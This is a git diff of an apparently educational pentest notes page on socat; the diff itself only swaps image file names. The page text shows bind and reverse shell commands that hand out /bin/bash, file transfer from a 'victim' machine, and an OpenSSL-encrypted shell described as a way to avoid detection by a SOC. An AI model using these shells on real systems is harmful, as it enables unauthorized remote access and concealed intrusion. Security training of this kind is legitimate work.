@@ -8,7 +8,7 @@ coverY: 0
 
 ### SOCAT
 
-<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption><p>Socat</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (220).png" alt=""><figcaption><p>Socat</p></figcaption></figure>
 
 * Connection To a TCP/UDP Port
 
@@ -22,7 +22,7 @@ socat - TCP4:<IP>:<PORT>
 
 &#x20;**`-`** Stdin
 
-<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>
 
 * Listening To a TCP/UDP Port
 
@@ -32,7 +32,7 @@ socat - TCP4:<IP>:<PORT>
 socat TCP4-LISTEN:<PORT> stdout
 ```
 
-<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (221).png" alt=""><figcaption></figcaption></figure>
 
 * Transfer File With Socat
 
@@ -49,7 +49,7 @@ socat  TCP4:<IP>:<PORT> file:sec.txt,create
 * **`file.tx`t**: This specifies the second address as a file. The data received from the TCP connection will be written to (or read from) this file. Here, `sec.txt` is the filename.
 * **`create`**: This option ensures that the file `sec.txt` is created if it does not already exist. Without this option, if the file does not exist, the command would fail.
 
-<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>
 
 **Victim** Machine &#x20;
 
@@ -63,7 +63,7 @@ socat TCP4-LISTEN:<PORT>,fork file:sec.txt
 * `fork`: This option tells `socat` to fork (_**create a new process**_) for each incoming connection. This allows `socat` to handle multiple connections simultaneously.
 * `file:sec.txt`: This specifies that the data received from each connection should be written to the file `sec.txt`.
 
-<figure><img src="../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>
 
 > **The advantage of `Socat` is that it allows more than one person to connect to the same port at the same time, and the connection is not separated, which is what distinguishes it from `NC`.**
 
@@ -78,7 +78,7 @@ socat tcp-listen:4444,fork - < sec.txt
 
 ```
 
-<figure><img src="../../../.gitbook/assets/image (62).png" alt=""><figcaption><p>From WSL Ubuntu , Connected In Termux</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (245).png" alt=""><figcaption><p>From WSL Ubuntu , Connected In Termux</p></figcaption></figure>
 
 <mark style="color:red;">`-`</mark> -> Using Standard Input , After This , Waiting for Input&#x20;
 
@@ -90,18 +90,18 @@ socat tcp-listen:4444,fork - < sec.txt
  socat tcp4:192.168.43.1:4444 - > sec.txt
 ```
 
-<figure><img src="../../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="color:red;">`-`</mark>    -> Using Standard Input , After This , Waiting for Input
 
 <mark style="color:red;">`>`</mark>    -> Using Redirect Character , Store In File  (Override)\
 <mark style="color:red;">`>>`</mark> -> If U Want Adding Content In File With Old Value&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (64).png" alt=""><figcaption><p>Fingerprint</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (247).png" alt=""><figcaption><p>Fingerprint</p></figcaption></figure>
 
 * Socat Bind
 
-<figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>
 
 **Attacker** Machine &#x20;
 
@@ -109,7 +109,7 @@ socat tcp-listen:4444,fork - < sec.txt
 socat  -d -d -d - TCP4:<IP>:<PORT>
 ```
 
-<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>
 
 **Victim** Machine &#x20;
 
@@ -119,7 +119,7 @@ socat  -d -d -d - TCP4:<IP>:<PORT>
 socat -d -d -d tcp4-listen:<PORT<,fork exec:/bin/bash
 ```
 
-<figure><img src="../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>
 
 * `socat`: The command-line utility for bidirectional data transfer between two independent data channels.
 * `-d -d -d`: These flags enable different levels of debugging output. Each `-d` increases the verbosity of the debug information.
@@ -137,7 +137,7 @@ socat -d -d -d tcp4-listen:<PORT<,fork exec:/bin/bash
 socat -d -d -v tcp4-listen:<PORT> stdout
 ```
 
-<figure><img src="../../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (230).png" alt=""><figcaption></figcaption></figure>
 
 **Victim** Machine &#x20;
 
@@ -146,11 +146,11 @@ socat  -d -d TCP4:<IP>:<PORT>,fork  exec:/bin/bash
 
 ```
 
-<figure><img src="../../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>
 
 ### Socat Encrypted Bund Shell&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 In normal use of the tool, if there is someone monitoring the communications that occur, if there is a SOC team monitoring everything that happens. It will see exactly what you are doing in terms of commands on the server or to victims inside the network and other things, so you may be easily detected and even know exactly what you were doing.
@@ -162,19 +162,19 @@ In normal use of the tool, if there is someone monitoring the communications tha
 ip.addr == 192.168.43.1 && tcp
 ```
 
-<figure><img src="../../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>
 
 **Here I use a filter to filter the TCP packets because you will find a lot of connections using more than one different protocol, and this is a normal thing within the network.**
 
 **--**
 
-<figure><img src="../../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (249).png" alt=""><figcaption></figcaption></figure>
 
 _**As you can see, as soon as he typed the ls command, the packet and connections started to appear**_
 
 _**--**_
 
-<figure><img src="../../../.gitbook/assets/image (67).png" alt=""><figcaption><p>Right Click > Follow > TCP Stream<br>Or<br>Ctrl + Alt + Shift + T</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (250).png" alt=""><figcaption><p>Right Click > Follow > TCP Stream<br>Or<br>Ctrl + Alt + Shift + T</p></figcaption></figure>
 
 {% hint style="info" %}
 If you notice some strange letters, this is because those strange letters have a relationship to the colors that appear in the terminal. Some of them have a relationship to the formats inside the terminal, such as dropping a new line to display the rest of the files, such as the color of the file name and the color of the folders.
@@ -193,7 +193,7 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
 
 ```
 
-<figure><img src="../../../.gitbook/assets/image (50).png" alt=""><figcaption><p>PEM</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (233).png" alt=""><figcaption><p>PEM</p></figcaption></figure>
 
 <mark style="color:red;">`req`</mark> ⇒ Indicates that we want to use OpenSSL in **requests** mode, which is used to create or process requests for SSL certificates.
 
@@ -215,7 +215,7 @@ Attacker
 socat - openssl:<IP>:<PORT>,verify=0
 ```
 
-<figure><img src="../../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -225,13 +225,13 @@ Victim&#x20;
 socat -d -d -v openssl-listen:6666,cert=bind.pem,fork,verify=0 exec:/bin/bash
 ```
 
-<figure><img src="../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>
 
 ### Wireshark
 
 > Data is Encrypted Using openssl
 
-<figure><img src="../../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>
 
 ### Socat VS Netcat
 
@@ -259,7 +259,7 @@ Choose the tool based on the complexity of the task and the level of control you
 
 
 
-<figure><img src="../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure>
 
 #### Summary Table
 
